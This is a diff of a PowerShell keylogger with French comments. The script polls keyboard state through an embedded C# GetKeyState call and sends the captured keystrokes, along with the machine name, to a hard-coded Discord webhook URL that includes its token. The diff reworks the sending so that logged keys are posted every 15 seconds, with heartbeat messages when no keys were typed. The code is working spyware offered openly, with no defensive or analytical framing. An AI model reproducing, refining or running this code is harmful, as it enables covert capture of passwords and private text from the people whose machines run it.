@@ -1,7 +1,6 @@
 $webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'
 
-# Message de démarrage identique à ton C#
-iwr $webhook -Method Post -Body (@{content="Keylogger pro lancé – $env:MACHINENAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+iwr $webhook -Method Post -Body (@{content="Keylogger natif parfait lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
 
 Add-Type @'
 using System;
@@ -14,11 +13,11 @@ public class K {
 }
 '@
 
-$buffer = New-Object Text.StringBuilder
-$lastSent = Get-Date
+$buffer = ''
+$lastSend = Get-Date
 
 while ($true) {
-    Start-Sleep -Milliseconds 30
+    Start-Sleep -m 30
 
     $shift = ([K]::GetKeyState(0x10) -band 0x8000) -ne 0
     $caps = ([K]::GetKeyState(0x14) -band 1) -ne 0
@@ -42,13 +41,18 @@ while ($true) {
                 }
             }
 
-            if ($i -ne 8) { $buffer.Append($char) | Out-Null }
-
-            if ($buffer.Length -ge 40 -or ((Get-Date) - $lastSent).TotalSeconds -gt 15) {
-                iwr $webhook -Method Post -Body (@{content=$buffer.ToString()}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
-                $buffer.Clear() | Out-Null
-                $lastSent = Get-Date
-            }
+            if ($i -ne 8) { $buffer += $char }
         }
+    }
+
+    # Envoi forcé toutes les 15 secondes, même si buffer < 40
+    if (((Get-Date) - $lastSend).TotalSeconds -ge 15) {
+        if ($buffer.Length -gt 0) {
+            iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+        } else {
+            iwr $webhook -Method Post -Body (@{content="[heartbeat]"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+        }
+        $buffer = ''
+        $lastSend = Get-Date
     }
 }
